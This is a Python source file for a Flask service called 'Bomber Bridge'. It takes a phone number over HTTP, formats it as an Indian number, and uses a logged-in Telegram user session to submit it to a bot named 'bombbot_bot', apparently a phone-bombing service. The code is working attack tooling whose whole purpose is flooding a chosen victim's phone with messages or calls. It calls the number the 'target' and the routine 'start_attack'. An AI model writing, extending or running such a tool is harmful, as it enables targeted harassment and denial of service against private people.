import asyncio, re, logging, os, threading
from flask import Flask, request, jsonify
from telethon import TelegramClient, errors

API_ID = int(os.getenv("API_ID", "0"))
API_HASH = os.getenv("API_HASH", "")
BRIDGE_SECRET = os.getenv("BRIDGE_SECRET", "mysecret123")
BOT_USERNAME = "bombbot_bot"

app = Flask(__name__)
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# 🟢 Single dedicated loop in background thread — Telethon safe
_bg_loop = None
_bg_thread = None
_client = None
_lock = threading.Lock()

def _run_loop():
    global _bg_loop
    _bg_loop = asyncio.new_event_loop()
    asyncio.set_event_loop(_bg_loop)
    _bg_loop.run_forever()

def _ensure_bg_loop():
    global _bg_thread
    if _bg_thread is None:
        with _lock:
            if _bg_thread is None:
                _bg_thread = threading.Thread(target=_run_loop, daemon=True)
                _bg_thread.start()
                # wait till loop is ready
                while _bg_loop is None:
                    pass

def run_async(coro):
    """Submit coro to background loop (same thread, same loop always)"""
    _ensure_bg_loop()
    future = asyncio.run_coroutine_threadsafe(coro, _bg_loop)
    return future.result(timeout=120)

def get_client():
    global _client
    if _client is None:
        # MUST pass loop= so Telethon binds to OUR loop, not a new one
        _client = TelegramClient(
            "session_bomber", API_ID, API_HASH,
            loop=_bg_loop
        )
    return _client

async def do_login():
    client = get_client()
    if not client.is_connected():
        await client.connect()
    if await client.is_user_authorized():
        logger.info("✅ Session valid")
        return True
    logger.error("❌ Session invalid/expired")
    return False

async def start_attack(number):
    client = get_client()
    num = re.sub(r'[\s\-\+\(\)]', '', number)
    if len(num) == 10:
        num = f"+91{num}"
    elif len(num) == 12 and num.startswith("91"):
        num = f"+{num}"

    bot = await client.get_entity(BOT_USERNAME)
    await client.send_message(bot, "/menu")
    await asyncio.sleep(2)

    async for msg in client.iter_messages(bot, limit=10):
        if msg.buttons:
            for row in msg.buttons:
                for btn in row:
                    if "START" in btn.text.upper():
                        await btn.click()
                        break
                else:
                    continue
                break
            break
        break

    await asyncio.sleep(2)
    await client.send_message(bot, num)
    await asyncio.sleep(2)

    async for msg in client.iter_messages(bot, limit=2):
        if not msg.outgoing and msg.text:
            return {"status": "success", "target": num, "bot_response": msg.text}
    return {"status": "success", "target": num, "bot_response": "Sent"}

@app.route("/", methods=["POST"])
def handle():
    data = request.get_json(force=True, silent=True)
    if not data or data.get("secret") != BRIDGE_SECRET:
        return jsonify({"error": "Secret galat hai"}), 403
    if data.get("action") != "bomb" or not data.get("number"):
        return jsonify({"error": "Sahi number daal bhai"}), 400
    try:
        ok = run_async(do_login())
        if not ok:
            return jsonify({"status": "failed",
                            "error": "Session expired. Re-login via Console."}), 401
        result = run_async(start_attack(data["number"]))
        return jsonify(result)
    except Exception as e:
        logger.exception("Attack failed")
        return jsonify({"status": "failed", "error": str(e)}), 500

@app.route("/", methods=["GET"])
def home():
    return jsonify({"service": "Bomber Bridge", "status": "running"})

if __name__ == "__main__":
    # threaded=False is mandatory — Telethon doesn't like multi-thread loops
    app.run(host="0.0.0.0", port=8080, threaded=False)
